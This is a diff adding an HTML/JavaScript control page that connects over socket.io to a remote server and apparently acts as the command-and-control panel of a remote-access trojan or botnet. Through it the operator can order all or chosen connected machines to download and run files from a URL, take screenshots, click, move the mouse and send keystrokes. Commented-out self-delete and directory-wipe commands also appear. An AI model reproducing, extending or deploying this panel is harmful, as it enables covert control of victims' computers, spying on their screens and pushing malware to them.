@@ -1,0 +1,439 @@
+<script src="https://cdn.socket.io/socket.io-1.4.5.js"></script>
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
+<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.1/css/bootstrap.min.css" />
+
+<script>
+    var socket;
+    socket = io('https://fosse.co', {
+        path: '/8110/socket.io'
+    });
+    //socket = io("http://fosse.co:80");
+
+    //socket = io("http://fosse.co:80/8110/socket.io");
+</script>
+
+
+<html>
+    
+    
+<style>
+    #console {
+    	float: left;
+    	width: 20%;
+    	overflow: auto;
+    	height: 80vh;
+			outline: 4px solid black;
+    	/*background-color: Red;*/
+    }
+
+    #picture {
+    	margin-left: 20%;
+    }
+	
+	#namesList {
+		width: 80%;
+		height: 100px;
+		overflow: auto;
+	}
+	
+</style>
+
+<!-- <body style="padding: 4%"> -->
+
+<body style="padding: 4%;">
+
+	<div id="container">
+
+		<div id="console">
+			All:
+			<br>
+			<br> download a file:
+			<form id="downloadForm">
+				<input id="downloadUrl" type="text" placeholder="url">
+				<button>submit</button>
+			</form>
+
+			<br> execute a file:
+			<form id="executionForm">
+				<input id="executionFilename" type="text" placeholder="filename">
+				<button>submit</button>
+			</form>
+
+			<br> Directed:
+			<br>
+			<br>
+			
+			target:
+			<br>
+			<input id="directedTarget" type="text" placeholder="">
+
+			<br>
+			<br> download a file:
+			<form id="directedDownloadForm">
+				<input id="directedDownloadUrl" type="text" placeholder="url">
+				<input id="directedDownloadUser" type="text" placeholder="name">
+				<button>submit</button>
+			</form>
+
+			<br> execute a file:
+			<form id="directedExecutionForm">
+				<input id="directedExecutionFilename" type="text" placeholder="filename">
+				<input id="directedExecutionUser" type="text" placeholder="name">
+				<button>submit</button>
+			</form>
+
+			<br> take a screenshot:
+			<form id="directedGetImageForm">
+				<input id="directedGetImageUser" type="text" placeholder="name">
+				<button>submit</button>
+			</form>
+
+			<br> click at coordinates:
+			<form id="directedLeftClickForm">
+				<input id="directedLeftClickX" type="number" placeholder="X Coordinate">
+				<input id="directedLeftClickY" type="number" placeholder="Y Coordinate">
+				<input id="directedLeftClickUser" type="text" placeholder="name">
+				<button>submit</button>
+			</form>
+
+			<br> move mouse to coordinates:
+			<form id="directedMoveMouseForm">
+				<input id="directedMoveMouseX" type="number" placeholder="X Coordinate">
+				<input id="directedMoveMouseY" type="number" placeholder="Y Coordinate">
+				<input id="directedMoveMouseUser" type="text" placeholder="name">
+				<button>submit</button>
+			</form>
+			
+			<br> send text:
+			<form id="directedSendTextForm">
+				<input id="directedSendTextText" type="text" placeholder="text">
+				<input id="directedSendTextUser" type="text" placeholder="name">
+				<button>submit</button>
+			</form>
+
+
+			<!--   <form id="sdelform">
+            <button>self delete to all</button>
+            </form> -->
+
+			<!-- <form id="deleteDirectoryForm">
+                <button>delete all in directory</button>
+            </form> -->
+
+			<form id="getImageForm">
+				<button>Get Image</button>
+			</form>
+			
+			<div>
+				<input type="checkbox" id="SendTextCheckBox">
+				<label for="subscribeNews">send keys</label>
+			</div>
+			
+			<br>
+			<form id="listAllForm">
+				<button>List All Connected Clients:</button>
+			</form>
+
+			<div id="namesList" class="list-group">
+			</div>
+			
+		</div>
+
+
+
+		<div id="picture" oncontextmenu="return false">
+		</div>
+
+	</div>
+
+</body>
+
+</html>
+
+<script>
+	
+	var globalEventTimer = false;
+	
+	function directedDownload(user, url) {
+		var data = {};
+		data.user = user;
+		data.url = url;
+		socket.emit("directedDownload", data);
+	}
+	
+	function directedExecution(user, filename) {
+		var data = {};
+		data.user = user;
+		data.filename = filename;
+		socket.emit("directedDownload", data);
+	}
+	
+	function directedGetImage(user) {
+		var data = {};
+		data.user = user;
+		socket.emit("directedGetImage", data);
+	}
+	
+	function directedMoveMouse(user, x, y) {
+		var data = {};
+		data.user = user;
+		data.x = x;
+		data.y = y;
+		socket.emit("directedMoveMouse", data);
+	}
+
+	function directedLeftClick(user, x, y) {
+		var data = {};
+		data.user = user;
+		data.x = x;
+		data.y = y;
+
+		socket.emit("directedLeftClick", data);
+	}
+
+	function directedRightClick(user, x, y) {
+		var data = {};
+		data.user = user;
+		data.x = x;
+		data.y = y;
+
+		socket.emit("directedRightClick", data);
+	}
+
+	function directedSendText(user, text) {
+		var data = {};
+		data.user = user;
+		data.text = text;
+
+		socket.emit("directedSendText", data);
+	}
+
+
+
+	// all:
+
+	$("#downloadForm").on("submit", function(event) {
+		event.preventDefault();
+		var url = $("#downloadUrl").val();
+		var data = {};
+		data.url = url;
+		socket.emit("download", data);
+	});
+
+
+	$("#executionForm").on("submit", function(event) {
+		event.preventDefault();
+		var filename = $("#executionFilename").val();
+		var data = {};
+		data.filename = filename;
+		socket.emit("execute", data);
+	});
+
+	$("#getImageForm").on("submit", function(event) {
+		event.preventDefault();
+		socket.emit("getImage");
+	});
+
+
+	$("#selfDeleteForm").on("submit", function(event) {
+		event.preventDefault();
+		socket.emit("selfDelete");
+	});
+
+	$("#deleteDirectoryForm").on("submit", function(event) {
+		event.preventDefault();
+		socket.emit("deleteDirectory");
+	});
+
+
+
+	// directed:
+
+	$("#directedDownloadForm").on("submit", function(event) {
+		event.preventDefault();
+
+		var url = $("#directedDownloadUrl").val();
+		var filename = $("#directedDownloadFilename").val();
+		var user = $("#directedDownloadUser").val();
+		
+		directedDownload(user, url);
+	});
+
+
+	$("#directedExecutionForm").on("submit", function(event) {
+		event.preventDefault();
+
+		var filename = $("#directedExecutionFilename").val();
+		var user = $("#directedExecutionUser").val();
+		
+		directedExecution(user, filename);
+	});
+
+	$("#directedGetImageForm").on("submit", function(event) {
+		event.preventDefault();
+
+		var user = $("#directedGetImageUser").val();
+		directedGetImage(user);
+	});
+	
+	$("#directedMoveMouseForm").on("submit", function(event) {
+		event.preventDefault();
+
+		var user = $("#directedMoveMouseUser").val();
+		var x = $("#directedMoveMouseX").val();
+		var y = $("#directedMoveMouseY").val();
+		
+		directedMoveMouse(user, x, y);
+	});
+
+	$("#directedLeftClickForm").on("submit", function(event) {
+		event.preventDefault();
+
+		var user = $("#directedLeftClickUser").val();
+		var x = $("#directedLeftClickX").val();
+		var y = $("#directedLeftClickY").val();
+		
+		directedLeftClick(user, x, y);
+	});
+	
+	$("#directedSendTextForm").on("submit", function(event) {
+		event.preventDefault();
+
+		var user = $("#directedSendTextUser").val();
+		var text = $("#directedSendTextText").val();
+
+		directedSendText(user, text);
+	});
+
+
+
+	// other:
+
+	//   $("#getNamesform").on("submit", function(event) {
+	//     event.preventDefault();
+	//     socket.emit("getNames");
+	//   });
+
+	$("#listAllForm").on("submit", function(event) {
+		event.preventDefault();
+		socket.emit("listAll");
+	});
+
+	socket.on("names", function(data) {
+		$("#namesList").empty();
+		for (var i = 0; i < data.length; i++) {
+			var div = $("<div class='list-group-item'>" + data[i] + "</div>");
+			$("#namesList").append(div);
+			
+			$("#namesList").last().on("click", function(event) {
+				var name = $(event.target).text();
+				//console.log(name);
+				$("#directedTarget").val(name);
+				directedGetImage(name);
+			});
+		}
+	});
+
+
+	function getMeta(url, callback) {
+		var img = new Image();
+		img.src = url;
+		img.onload = function() {
+			callback(this.width, this.height);
+		}
+	}
+
+
+	socket.on("viewImage", function(data) {
+		//console.log(data);
+
+		var src = "data:image/png;base64," + data.src;
+
+		$("#directedTarget").val(data.name);
+
+		var image = new Image();
+		image.src = src;
+		image.style = "max-width:100%; height:auto;";
+		image.id = "screenshot";
+		$("#picture").empty();
+		$("#picture").append(image);
+
+		$("#screenshot").on( /*"click"*/ "mousedown", function(event) {
+			event.preventDefault();
+
+			var x1 = event.offsetX ? (event.offsetX) : event.pageX - document.getElementById("screenshot").offsetLeft;
+			var y1 = event.offsetY ? (event.offsetY) : event.pageY - document.getElementById("screenshot").offsetTop;
+
+			getMeta(src, function(srcWidth, srcHeight) {
+
+				var xRatio = srcWidth / image.width;
+				var yRatio = srcHeight / image.height;
+
+				var x2 = parseInt(x1 * xRatio);
+				var y2 = parseInt(y1 * yRatio);
+				var user = $("#directedTarget").val();
+
+				//console.log(event.which);
+				switch (event.which) {
+					case 1:
+						directedLeftClick(user, x2, y2); // left click
+						break;
+					case 2:
+						directedMoveMouse(user, x2, y2); // middle click
+						break;
+					case 3:
+						directedRightClick(user, x2, y2); // right click
+						break;
+				}
+				setTimeout(function() {
+					directedGetImage(user);
+				}, 200);
+			});
+		});
+		
+		
+// 		$(document).keypress(function(event) {
+			
+// 			var isChecked = $("#SendTextCheckBox").is(":checked");
+// 			var user = $("#directedTarget").val();
+// 			if(user != "" && isChecked && !globalEventTimer) {
+// 				globalEventTimer = true;
+// 				console.log(event.key);
+// 				directedSendText(user, event.key);
+// // 				setTimeout(function() {
+// // 					directedGetImage(user);
+// // 				}, 200);
+// 			}
+// 		});
+		
+		$(document).keydown(function(event) {
+			event.preventDefault();
+			
+			var isChecked = $("#SendTextCheckBox").is(":checked");
+			var user = $("#directedTarget").val();
+			if(user != "" && isChecked && !globalEventTimer) {
+				globalEventTimer = true;
+				console.log(event.key);
+				directedSendText(user, event.key);
+// 				setTimeout(function() {
+// 					directedGetImage(user);
+// 				}, 200);
+			}
+		});
+		
+	});
+	
+	
+	
+	setInterval(function() {
+		globalEventTimer = false;
+	}, 100);
+	
+	setInterval(function() {
+		var user = $("#directedTarget").val();
+		directedGetImage(user);
+	}, 2000);
+	
+
+	
+</script>
